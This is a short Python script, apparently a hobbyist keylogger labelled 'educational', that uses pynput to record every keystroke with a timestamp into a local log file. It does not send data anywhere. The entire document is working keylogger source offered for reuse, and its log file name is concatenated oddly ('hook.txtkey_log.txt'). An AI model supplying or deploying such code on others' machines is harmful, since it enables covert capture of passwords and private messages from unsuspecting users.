#Code by: Matheus Franco // Kyogin
#Educational Content ONLY
#Feel free to change this code

from pynput.keyboard import Key, Listener
import logging

log_dir = "hook.txt" #.txt será criado no diretório no seu .py, caso queira alterar, colocar o caminho aí

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()